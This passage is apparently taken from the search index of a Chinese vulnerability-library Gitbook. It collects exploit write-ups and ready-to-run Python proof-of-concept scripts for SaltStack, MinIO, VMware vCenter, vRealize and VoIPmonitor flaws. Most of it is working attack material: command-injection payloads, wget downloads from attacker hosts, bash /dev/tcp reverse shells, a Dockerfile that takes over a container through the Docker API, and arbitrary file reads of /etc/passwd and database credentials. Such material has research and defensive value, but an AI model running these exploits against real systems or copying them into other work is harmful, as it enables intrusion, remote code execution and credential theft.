root_key: print('[*] root key obtained: {}'.format(root_key)) else: print('[-] Failed to find root key...aborting') sys.exit(127) if args.run_checks: # Assuming this check runs on the master itself, create a file with \"secret\" content # and abuse CVE-2020-11652 to read it. top_secret_file_path = '/tmp/salt_cve_teta' with salt.utils.fopen(top_secret_file_path, 'w') as fd: fd.write(\"top secret\") # Again, this assumes we're running this check on the master itself with salt.utils.fopen('/var/cache/salt/master/.root_key') as keyfd: root_key = keyfd.read() check_CVE_2020_11652_read_token(debug, channel, top_secret_file_path) check_CVE_2020_11652_read(debug, channel, top_secret_file_path, root_key) check_CVE_2020_11652_write1(debug, channel, root_key) check_CVE_2020_11652_write2(debug, channel, root_key) os.remove(top_secret_file_path) sys.exit(0) if args.read_file: pwn_read_file(channel, root_key, args.read_file, args.master_ip) if args.upload_src: if os.path.isabs(args.upload_dest): print('[-] Destination path must be relative; aborting') sys.exit(1) pwn_upload_file(channel, root_key, args.upload_src, args.upload_dest, args.master_ip) jid = '{0:%Y%m%d%H%M%S%f}'.format(datetime.datetime.utcnow()) if args.exec: pwn_exec(channel, root_key, args.exec, args.master_ip, jid) if args.exec_all: print(\"[!] Lester, is this what you want? Hit ^C to abort.\") time.sleep(2) pwn_exec_all(channel, root_key, args.exec_all, args.master_ip, jid) if __name__ == '__main__': main() 参考文章 https://www.cdxy.me/?p=822 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/服务器应用漏洞/Saltstack/SaltStack 未授权访问命令执行漏洞 CVE-2020-16846 25592.html":{"url":"book/服务器应用漏洞/Saltstack/SaltStack 未授权访问命令执行漏洞 CVE-2020-16846 25592.html","title":"SaltStack 未授权访问命令执行漏洞 CVE-2020-16846/25592","keywords":"","body":"SaltStack 未授权访问命令执行漏洞 CVE-2020-16846/25592 漏洞描述 2020年11月4日，SaltStack 官方发布了一则安全更新公告，其中CVE-2020-16846和CVE-2020-25592组合使用可在未授权的情况下通过salt-api接口执行任意命令。CVE-2020-25592允许任意用户调用SSH模块，CVE-2020-16846允许用户执行任意命令。salt-api虽不是默认开启配置，但绝大多数SaltStack用户会选择开启salt-api，故存在较高风险。 漏洞影响 [!NOTE] SaltStack Version 3002 SaltStack Version 3001.1, 3001.2 SaltStack Version 3000.3, 3000.4 SaltStack Version 2019.2.5, 2019.2.6 SaltStack Version 2018.3.5 SaltStack Version 2017.7.4, 2017.7.8 SaltStack Version 2016.11.3, 2016.11.6,2016.11.10 SaltStack Version 2016.3.4, 2016.3.6,2016.3.8 SaltStack Version 2015.8.10, 2015.8.13 环境搭建 [!NOTE] git clone https://github.com/vulhub/vulhub.git cd vulhub/saltstack/CVE-2020-16846 docker-compose up -d 漏洞复现 salt-api REST接口默认使用cherrypy框架，从run接口的实现上可以看出通过client参数动态调用NetapiClient类中的方法。 文中指定代码位置采用以下约定 FileLocation:Classname.method() salt/netapi/init.py:NetapiClient.run() low参数为外部传入参数，salt.utils.args.format_call方法将参数赋值给kwargs。 当client参数为ssh时，动态调用salt/netapi/init.py:NetapiClient.ssh(), 该方法未采用任何鉴权。 salt/netapi/init.py:NetapiClient.ssh() 跟进，路径如下： salt/netapi/init.py:NetapiClient.ssh()⇒salt/client/ssh/client.py:SSHClient.cmd_sync()⇒salt/client/ssh/client.py:SSHClient._prep_ssh() salt/client/ssh/client.py:SSHClient._prep_ssh() 该方法将kwargs外部可控参数更新值opts变量，该变量可以理解为SaltStack系统的环境变量，使用该变量初始化salt.client.ssh.SSH。 salt/client/ssh/init.py:SSH.init() priv的值从opts变量中获取，并调用salt.client.ssh.shell.gen_key()方法。 salt/client/ssh/shell.py:gen_key() POC请求包为 POST /run HTTP/1.1 Host: 127.0.0.1:8000 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:68.0) Gecko/20100101 Firefox/68.0 Accept: application/x-yaml Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate DNT: 1 Connection: close Upgrade-Insecure-Requests: 1 Content-Type: application/x-www-form-urlencoded Content-Length: 109 token=12312&client=ssh&tgt=*&fun=a&roster=whip1ash&ssh_priv=aaa|wget http://xxx.dnslog.cn 反弹shell的方法 先写 bash文件，内容为反弹shell语句，使用wget下载到目标中 [!NOTE] !/bin/sh bash -c 'exec bash -i &>/dev/tcp/xxx.xxx.xxx.xxx/9999 监听端口，使用 /bin/bash 运行文件 反弹shell 漏洞利用POC [!NOTE] POC目录中 peiqi.sh文件 需要更改反弹ip,port,并上传到服务器让目标进行下载 DNS有响应则代表可能有漏洞，便可以进行反弹shell import requests import sys import random import re from requests.packages.urllib3.exceptions import InsecureRequestWarning def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34m公众号 : PeiQi文库 \\033[0m') print('+ \\033[34mVersion: SaltStack Version >> http://xxx.xxx.xxx.xxx \\033[0m') print('+ \\033[36mDnslog >>> xxx.dnslog.cn \\033[0m') print('+ \\033[36mFile_addr >>> http://xxx.xxx.xxx/cmd.sh \\033[0m') print('+ \\033[36mFile_name >>> cmd.sh \\033[0m') print('+------------------------------------------') def POC_1(target_url, dnslog): vuln_url = target_url + \"/run\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Accept-Encoding\": \"gzip, deflate\", \"DNT\": \"1\", \"Connection\": \"close\", \"Upgrade-Insecure-Requests\": \"1\", \"Content-Type\": \"application/x-www-form-urlencoded\", \"Accept\": \"application/x-yaml\", \"Accept-Language\": \"en-US,en;q=0.5\" } data = \"token=12312&client=ssh&tgt=*&fun=a&roster=whip1ash&ssh_priv=peiqi|wget http://{}\".format(dnslog) try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(url=vuln_url, data=data, headers=headers, verify=False, timeout=10) print(\"\\033[32m[o] 正在执行 wget http://{} \\033[0m\".format(dnslog)) if \"return\" in response.text and response.status_code == 200: print(\"\\033[32m[o] 请查看 Dnslog响应 \\033[0m\") while True: Chois = input(\"\\033[35m是否反弹 Shell(Y/N) >>> \\033[0m\") if Chois == \"Y\" or Chois == \"y\": File_addr = input(\"\\033[35mFile_addr >>> \\033[0m\") File_name = input(\"\\033[35mFile_name >>> \\033[0m\") POC_2(target_url, File_addr, File_name) else: sys.exit(0) else: print(\"\\033[31m[x] 请求失败 \\033[0m\") sys.exit(0) except Exception as e: print(\"\\033[31m[x] 请求失败 \\033[0m\", e) def POC_2(target_url, File_addr, File_name): vuln_url = target_url + \"/run\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Accept-Encoding\": \"gzip, deflate\", \"DNT\": \"1\", \"Connection\": \"close\", \"Upgrade-Insecure-Requests\": \"1\", \"Content-Type\": \"application/x-www-form-urlencoded\", \"Accept\": \"application/x-yaml\", \"Accept-Language\": \"en-US,en;q=0.5\" } data = \"token=12312&client=ssh&tgt=*&fun=a&roster=whip1ash&ssh_priv=peiqi|wget {}\".format(File_addr) try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(url=vuln_url, data=data, headers=headers, verify=False, timeout=10) print(\"\\033[32m[o] 正在执行 wget {} \\033[0m\".format(File_addr)) if \"return\" in response.text and response.status_code == 200: print(\"\\033[32m[o] 成功下载{} \\033[0m\".format(File_addr)) POC_3(target_url, File_name) else: print(\"\\033[31m[x] 请求失败 \\033[0m\") sys.exit(0) except Exception as e: print(\"\\033[31m[x] 请求失败 \\033[0m\", e) def POC_3(target_url, File_name): vuln_url = target_url + \"/run\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Accept-Encoding\": \"gzip, deflate\", \"DNT\": \"1\", \"Connection\": \"close\", \"Upgrade-Insecure-Requests\": \"1\", \"Content-Type\": \"application/x-www-form-urlencoded\", \"Accept\": \"application/x-yaml\", \"Accept-Language\": \"en-US,en;q=0.5\" } data = \"token=12312&client=ssh&tgt=*&fun=a&roster=whip1ash&ssh_priv=peiqi|/bin/bash {}\".format(File_name) try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(url=vuln_url, data=data, headers=headers, verify=False, timeout=10) print(\"\\033[32m[o] 正在执行 /bin/bash \\033[0m\".format(File_name)) if \"return\" in response.text and response.status_code == 200: print(\"\\033[32m[o] 命令执行完毕，请查看是否反弹Shell \\033[0m\".format(File_name)) sys.exit(0) else: print(\"\\033[31m[x] 请求失败 \\033[0m\") sys.exit(0) except Exception as e: print(\"\\033[32m[o] 命令执行成功 \\033[0m\") sys.exit(0) if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) dnslog = str(input(\"\\033[35mDnslog >>> \\033[0m\")) POC_1(target_url, dnslog) 参考文章 https://mp.weixin.qq.com/s/R8qw_lWizGyeJS0jOcYXag 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/服务器应用漏洞/MinIO/":{"url":"book/服务器应用漏洞/MinIO/","title":"MinIO","keywords":"","body":"MinIO MinIO SSRF漏洞 CVE-2021-21287 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/服务器应用漏洞/MinIO/MinIO SSRF漏洞 CVE-2021-21287.html":{"url":"book/服务器应用漏洞/MinIO/MinIO SSRF漏洞 CVE-2021-21287.html","title":"MinIO SSRF漏洞 CVE-2021-21287","keywords":"","body":"MinIO SSRF漏洞 CVE-2021-21287 漏洞描述 随着工作和生活中的一些环境逐渐往云端迁移，对象存储的需求也逐渐多了起来，MinIO就是一款支持部署在私有云的开源对象存储系统。MinIO完全兼容AWS S3的协议，也支持作为S3的网关，所以在全球被广泛使用，在Github上已有25k星星。MinIO中存在SSRF漏洞，通过漏洞可以获取敏感信息或远程命令执行 漏洞影响 [!NOTE] MinIO 漏洞复现 既然我们选择了从MinIO入手，那么先了解一下MinIO。其实我前面也说了，因为平时用到MinIO的时候很多，所以这一步可以省略了。其使用Go开发，提供HTTP接口，而且还提供了一个前端页面，名为“MinIO Browser”。当然，前端页面就是一个登陆接口，不知道口令无法登录。 那么从入口点（前端接口）开始对其进行代码审计吧。 在User-Agent满足正则.*Mozilla.*的情况下，我们即可访问MinIO的前端接口，前端接口是一个自己实现的JsonRPC： 我们感兴趣的就是其鉴权的方法，随便找到一个RPC方法，可见其开头调用了webRequestAuthenticate，跟进看一下，发现这里用的是jwt鉴权： jwt常见的攻击方法主要有下面这几种： 将alg设置为None，告诉服务器不进行签名校验 如果alg为RSA，可以尝试修改为HS256，即告诉服务器使用公钥进行签名的校验 爆破签名密钥 查看MinIO的JWT模块，发现其中对alg进行了校验，只允许以下三种签名方法： 这就堵死了前两种绕过方法，爆破当然就更别说了，通常仅作为没办法的情况下的手段。当然，MinIO中使用用户的密码作为签名的密钥，这个其实会让爆破变地简单一些。 鉴权这块没啥突破，我们就可以看看，有哪些RPC接口没有进行权限验证。 很快找到了一个接口，LoginSTS。这个接口其实是AWS STS登录接口的一个代理，用于将发送到JsonRPC的请求转变成STS的方式转发给本地的9000端口（也就还是他自己，因为它是兼容AWS协议的）。 简化其代码如下： // LoginSTS - STS user login handler. func (web *webAPIHandlers) LoginSTS(r *http.Request, args *LoginSTSArgs, reply *LoginRep) error { ctx := newWebContext(r, args, \"WebLoginSTS\") v := url.Values{} v.Set(\"Action\", webIdentity) v.Set(\"WebIdentityToken\", args.Token) v.Set(\"Version\", stsAPIVersion) scheme := \"http\" // ... u := &url.URL{ Scheme: scheme, Host: r.Host, } u.RawQuery = v.Encode() req, err := http.NewRequest(http.MethodPost, u.String(), nil) // ... } 没发现有鉴权上的绕过问题，但是发现了另一个有趣的问题。这里，MinIO为了将请求转发给“自己”，就从用户发送的HTTP头Host中获取到“自己的地址”，并将其作为URL的Host构造了新的URL。 这个过程有什么问题呢？ 因为请求头是用户可控的，所以这里可以构造任意的Host，进而构造一个SSRF漏洞。 我们来实际测试一下，向http://192.168.227.131:9000发送如下请求，其中Host的值是我本地ncat开放的端口（192.168.1.142:4444）： POST /minio/webrpc HTTP/1.1 Host: 192.168.1.142:4444 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36 Content-Type: application/json Content-Length: 80 {\"id\":1,\"jsonrpc\":\"2.0\",\"params\":{\"token\": \"Test\"},\"method\":\"web.LoginSTS\"} 成功收到请求： 可以确定这里存在一个SSRF漏洞了。 仔细观察，可以发现这是一个POST请求，但是Path和Body都没法控制，我们能控制的只有URL中的一个参数WebIdentityToken。 但是这个参数经过了URL编码，无法注入换行符等其他特殊字符。这样就比较鸡肋了，如果仅从现在来看，这个SSRF只能用于扫描端口。我们的目标当然不仅限于此。 幸运的是，Go默认的http库会跟踪302跳转，而且不论是GET还是POST请求。所以，我们这里可以302跳转来“升级”SSRF漏洞。 使用PHP来简单地构造一个302跳转： 将其保存成index.php，启动一个PHP服务器： 将Host指向这个PHP服务器。这样，经过一次302跳转，我们收获了一个可以控制完整URL的GET请求： 放宽了一些限制，结合前面我对这套内网的了解，我们可以尝试攻击Docker集群的2375端口。 2375是Docker API的接口，使用HTTP协议通信，默认不会监听TCP地址，这里可能是为了方便内网其他机器使用所以开放在内网的地址里了。那么，我们是否可以通过SSRF来攻击这个接口呢？ 在Docker未授权访问的情况下，我们通常可以使用docker run或docker exec来在目标容器里执行任意命令（如果你不了解，可以参考这篇文章）。但是翻阅Docker的文档可知，这两个操作的请求是POST /containers/create和POST /containers/{id}/exec。 两个API都是POST请求，而我们可以构造的SSRF却是一个GET的。怎么办呢？ 还记得我们是怎样获得这个GET型的SSRF的吗？通过302跳转，而接受第一次跳转的请求就是一个POST请求。不过我们没法直接利用这个POST请求，因为他的Path不可控。 如何构造一个Path可控的POST请求呢？ 我想到了307跳转，307跳转是在RFC 7231中定义的一种HTTP状态码，描述如下： The 307 (Temporary Redirect) status code indicates that the target resource resides temporarily under a different URI and the user agent MUST NOT change the request method if it performs an automatic redirection to that URI. 307跳转的特点就是不会改变原始请求的方法，也就是说，在服务端返回307状态码的情况下，客户端会按照Location指向的地址发送一个相同方法的请求。 我们正好可以利用这个特性，来获得POST请求。 简单修改一下之前的index.php： 尝试SSRF攻击，收到了预期的请求： Bingo，获得了一个POST请求的SSRF，虽然没有Body。 回到Docker API，我发现现在仍然没法对run和exec两个API做利用，原因是，这两个API都需要在请求Body中传输JSON格式的参数，而我们这里的SSRF无法控制Body。 继续翻越Docker文档，我发现了另一个API，Build an image： 这个API的大部分参数是通过Query Parameters传输的，我们可以控制。阅读其中的选项，发现它可以接受一个名为remote的参数，其说明为： A Git repository URI or HTTP/HTTPS context URI. If the URI points to a single text file, the file’s contents are placed into a file called Dockerfile and the image is built from that file. If the URI points to a tarball, the file is downloaded by the daemon and the contents therein used as the context for the build. If the URI points to a tarball and the dockerfile parameter is also specified, there must be a file with the corresponding path inside the tarball. 这个参数可以传入一个Git地址或者一个HTTP URL，内容是一个Dockerfile或者一个包含了Dockerfile的Git项目或者一个压缩包。 也就是说，Docker API支持通过指定远程URL的方式来构建镜像，而不需要我在本地写入一个Dockerfile。 所以，我尝试编写了这样一个Dockerfile，看看是否能够build这个镜像，如果可以，那么我的4444端口应该能收到wget的请求： FROM alpine:3.13 RUN wget -T4 http://192.168.1.142:4444/docker/build 然后修改前面的index.php，指向Docker集群的2375端口： 进行SSRF攻击，等待了一会儿，果然收到请求了： 完美，我们已经可以在目标集群容器里执行任意命令了。 此时离我们的目标，拿下MinIO，还差一点点，后面的攻击其实就比较简单了。 因为现在可以执行任意命令，我们就不会再受到SSRF漏洞的限制，可以直接反弹一个shell，或者可以直接发送任意数据包到Docker API，来访问容器。经过一顿测试，我发现MinIO虽然是运行的一个service，但实际上就只有一个容器。 所以我编写了一个自动化攻击MinIO容器的脚本，并将其放在了Dockerfile中，让其在Build的时候进行攻击，利用docker exec在MinIO的容器里执行反弹shell的命令。这个Dockerfile如下： FROM alpine:3.13 RUN apk add curl bash jq RUN set -ex && \\ { \\ echo '#!/bin/bash'; \\ echo 'set -ex'; \\ echo 'target=\"http://192.168.227.131:2375\"'; \\ echo 'jsons=$(curl -s -XGET \"${target}/containers/json\" | jq -r \".[] | @base64\")'; \\ echo 'for item in ${jsons[@]}; do'; \\ echo ' name=$(echo $item | base64 -d | jq -r \".Image\")'; \\ echo ' if [[ \"$name\" == *\"minio/minio\"* ]]; then'; \\ echo ' id=$(echo $item | base64 -d | jq -r \".Id\")'; \\ echo ' break'; \\ echo ' fi'; \\ echo 'done'; \\ echo 'execid=$(curl -s -X POST \"${target}/containers/${id}/exec\" -H \"Content-Type: application/json\" --data-binary \"{\\\"Cmd\\\": [\\\"bash\\\", \\\"-c\\\", \\\"bash -i >& /dev/tcp/192.168.1.142/4444 0>&1\\\"]}\" | jq -r \".Id\")'; \\ echo 'curl -s -X POST \"${target}/exec/${execid}/start\" -H \"Content-Type: application/json\" --data-binary \"{}\"'; \\ } | bash 这个脚本所干的事情比较简单，一个是遍历了所有容器，如果发现其镜像的名字中包含minio/minio，则认为这个容器就是MinIO所在的容器。拿到这个容器的Id，用exec的API，在其中执行反弹shell的命令 Youtube 演示链接 当然，我们也可以通过Docker API来获取集群权限 参考文章 https://www.leavesongs.com/PENETRATION/the-collision-of-containers-and-the-cloud-pentesting-a-MinIO.html 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/服务器应用漏洞/VMware/":{"url":"book/服务器应用漏洞/VMware/","title":"VMware","keywords":"","body":"VMware VMware vCenter任意文件读取漏洞 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/服务器应用漏洞/VMware/VMware vCenter任意文件读取漏洞.html":{"url":"book/服务器应用漏洞/VMware/VMware vCenter任意文件读取漏洞.html","title":"VMware vCenter任意文件读取漏洞","keywords":"","body":"VMware vCenter任意文件读取漏洞 漏洞描述 VMware vCenter特定版本存在任意文件读取漏洞，攻击者通过构造特定的请求，可以读取服务器上任意文件、 漏洞影响 [!NOTE] VMware vCenter Server 6.5.0a- f 版本 FOFA [!NOTE] title=\"ID_VC_Welcome\" 漏洞复现 使用POC访问漏洞点 [!NOTE] Windows主机 http://xxx.xxx.xxx.xxx/eam/vib?id=C:\\ProgramData\\VMware\\vCenterServer\\cfg\\vmware-vpx\\vcdb.properties [!NOTE] Linux主机 https://xxx.xxx.xxx.xxx/eam/vib?id=/etc/passwd 漏洞利用POC import requests import sys import random import re from requests.packages.urllib3.exceptions import InsecureRequestWarning def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mVersion: VMware vCenter任意文件读取漏洞 \\033[0m') print('+ \\033[36m使用格式: python3 poc.py \\033[0m') print('+ \\033[36mUrl >>> http://xxx.xxx.xxx.xxx \\033[0m') print('+------------------------------------------') def POC_1(target_url): vuln_url_windows = target_url + \"/eam/vib?id=C:\\ProgramData\\VMware\\\\vCenterServer\\cfg\\\\vmware-vpx\\\\vcdb.properties\" vuln_url_linux = target_url + \"/eam/vib?id=/etc/passwd\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", } try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response_linux = requests.get(url=vuln_url_linux, headers=headers, verify=False, timeout=5) response_windows = requests.get(url=vuln_url_windows, headers=headers, verify=False, timeout=5) if \"password\" in response_windows.text and response_windows.status_code == 200: print(\"\\033[32m[o] 目标 {}存在漏洞 ,成功读取 vcdb.properties \\033[0m\".format(target_url)) print(\"\\033[32m[o] Windows系统, 响应为:\\n{} \\033[0m\".format(response_windows.text)) elif \"root\" in response_linux.text and response_linux.status_code == 200: print(\"\\033[32m[o] 目标 {}存在漏洞 ,成功读取 /etc/passwd \\033[0m\".format(target_url)) print(\"\\033[32m[o] Linux系统, 响应为:\\n{} \\033[0m\".format(response_linux.text)) else: print(\"\\033[31m[x] 不存在漏洞 \\033[0m\") sys.exit(0) except Exception as e: print(\"\\033[31m[x] 请求失败 \\033[0m\", e) if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) POC_1(target_url) 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/服务器应用漏洞/VMware/VMware vRealize Operations Manager SSRF漏洞 CVE-2021-21975.html":{"url":"book/服务器应用漏洞/VMware/VMware vRealize Operations Manager SSRF漏洞 CVE-2021-21975.html","title":"VMware vRealize Operations Manager SSRF漏洞 CVE-2021-21975","keywords":"","body":"VMware vRealize Operations Manager SSRF漏洞 CVE-2021-21975 漏洞描述 vRealize Operations Manager API包含服务器端请求伪造。可以通过网络访问vRealize Operations Manager API的恶意攻击者可以执行服务器端请求伪造攻击(SSRF)，以窃取管理凭据。 漏洞影响 [!NOTE] VMware:vRealize_operations_manager: 8.0.0, 8.0.1, 8.3.0, 8.1.0, 8.1.1, 8.2.0, 7.5.0 VMware:cloud_foundation: 4.x 3.x VMware:vRealize_suite_lifecycle_manager: 8.x FOFA [!NOTE] title=\"vRealize Operations Manager\" 漏洞复现 访问登录页面如下 发送请求包如下 POST /casa/nodes/thumbprints HTTP/1.1 Host: xxx.xxx.xxx.xxx Content-Type: application/json;charset=UTF-8 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Content-Length: 24 [\"eheeyd.dnslog.cn\"] POST /casa/nodes/thumbprints HTTP/1.1 Host: xxx.xxx.xxx.xxx Content-Type: application/json;charset=UTF-8 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Content-Length: 24 [\"127.0.0.1:443/ui\"] 漏洞利用POC import requests import sys import random import re from requests.packages.urllib3.exceptions import InsecureRequestWarning def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34m公众号 : PeiQi文库 \\033[0m') print('+ \\033[34mVersion: VMware vRealize Operations Manager \\033[0m') print('+ \\033[36m使用格式: python3 poc.py \\033[0m') print('+ \\033[36mUrl >>> http://xxx.xxx.xxx.xxx \\033[0m') print('+ \\033[36mDnslog >>> xxx.dnslog.com \\033[0m') print('+------------------------------------------') def POC_1(target_url, v): vuln_url = target_url + \"/casa/nodes/thumbprints\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Content-Type\": \"application/json;charset=UTF-8\" } data = '[\"{}\"]'.format(Dnslog) try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(url=vuln_url, headers=headers, data=data, verify=False, timeout=10) if response.status_code == 200 : print(\"\\033[32m[o] 目标 {} 可能存在SSRF漏洞,请检查 Dnslog 响应 \\033[0m\".format(target_url, vuln_url)) else: print(\"\\033[31m[x] 目标 {} 不存在漏洞 \\033[0m\".format(target_url)) except Exception as e: print(\"\\033[31m[x] 目标 {} 请求失败 \\033[0m\".format(target_url)) if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) Dnslog = str(input(\"\\033[35mDnslog >>> \\033[0m\")) POC_1(target_url, Dnslog) Goby & POC [!NOTE] 已上传 https://github.com/PeiQi0/PeiQi-WIKI-POC Goby & POC 目录中 VMWare Operations vRealize Operations Manager API SSRF CVE-2021-21975 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/服务器应用漏洞/VoIPmonitor/":{"url":"book/服务器应用漏洞/VoIPmonitor/","title":"VoIPmonitor","keywords":"","body":"VoIPmonitor VoIPmonitor 远程命令执行漏洞 CVE-2021-30461 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/服务器应用漏洞/VoIPmonitor/VoIPmonitor 远程命令执行漏洞 CVE-2021-30461.html":{"url":"book/服务器应用漏洞/VoIPmonitor/VoIPmonitor 远程命令执行漏洞 CVE-2021-30461.html","title":"VoIPmonitor 远程命令执行漏洞 CVE-2021-30461","keywords":"","body":"VoIPmonitor 远程命令执行漏洞 CVE-2021-30461 漏洞描述 VoIPmonitor是“具有在Linux上运行的SIP RTP和RTCP VoIP协议的具有商业前端的开源网络数据包嗅探器”。 使用通过Web界面到达的用户提供的数据，允许未经身份验证的远程用户触发VoIPmonitor中的远程PHP代码执行漏洞。 漏洞影响 [!NOTE] VoIPmonitor FOFA [!NOTE] \"VoIPmonitor\" 漏洞复现 登录页面如下 index.php文件中的关键代码 $setConfigurationTypeValue_rslt = array(); if(file_exists('config/configuration.php')) { $existsConfiguration = true; if(isset($_POST['recheck'])) { if(!empty($_POST['SPOOLDIR'])) { setConfigurationTypeValue__index('SPOOLDIR', $_POST['SPOOLDIR']); } } 传入参数 recheck 和 SPOOLDIR， 并将SPOOLDIR 写入 config/configuration.php 中 发送如下请求包 POST /index.php HTTP/1.1 Host: User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0 Accept-Encoding: gzip, deflate Accept: */* Connection: close Accept-Language: en-US,en;q=0.5 Content-Type: application/x-www-form-urlencoded; charset=UTF-8 Content-Length: 29 SPOOLDIR=%2Ftmp&recheck=annen POST /index.php HTTP/1.1 Host: User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0 Accept-Encoding: gzip, deflate Accept: */* Connection: close Accept-Language: en-US,en;q=0.5 Content-Type: application/x-www-form-urlencoded; charset=UTF-8 Content-Length: 49 SPOOLDIR=test%22.system%28id%29.%22&recheck=annen 成功执行命令 漏洞POC #!/usr/bin/python3 #-*- coding:utf-8 -*- # author : PeiQi # from : http://wiki.peiqi.tech import base64 import requests import random import re import json import sys from requests.packages.urllib3.exceptions import InsecureRequestWarning def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34m公众号 : PeiQi文库 \\033[0m') print('+ \\033[34mVersion: 锐捷EG网关 cli.php RCE \\033[0m') print('+ \\033[36m使用格式: python3 poc.py \\033[0m') print('+ \\033[36mUrl >>> http://xxx.xxx.xxx.xxx \\033[0m') print('+------------------------------------------') def POC_1(target_url): vuln_url = target_url + \"/index.php\" data = {\"SPOOLDIR\": \"/tmp\", \"recheck\": \"annen\"} headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Content-Type\": \"application/x-www-form-urlencoded\" } try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(url=vuln_url, data=data, headers=headers, verify=False) except Exception as e: print(\"\\033[31m[x] 请求失败:{} \\033[0m\".format(e)) sys.exit(0) POC_2(target_url) def POC_2(target_url): vuln_url = target_url + \"/index.php\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Content-Type\": \"application/x-www-form-urlencoded\" } data = {\"SPOOLDIR\": \"test\\\".system(id).\\\"\", \"recheck\": \"annen\"} print(\"\\033[36m[o] 正在执行命令 id .....\\033[0m\") try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(url=vuln_url, data=data, headers=headers, verify=False) if \"uid=\" in response.text: print(\"\\033[36m[o] 成功执行 id, 目标存在漏洞.....\\033[0m\") else: print(\"\\033[31m[x] 请求失败 \\033[0m\") exit() except Exception as e: print(\"\\033[31m[x] 请求失败:{} \\033[0m\".format(e)) sys.exit(0) if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) POC_1(target_url) 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/Web应用漏洞/":{"url":"book/Web应用漏洞/","title":"Web应用漏洞","keywords":"","body":"Web应用漏洞🦌 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/Web应用漏洞/SonarQube/":{"url":"book/Web应用漏洞/SonarQube/","title":"SonarQube","keywords":"","body":"SonarQube SonarQube api 信息泄露漏洞 CVE-2020-27986 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/Web应用漏洞/SonarQube/SonarQube api 信息泄露漏洞 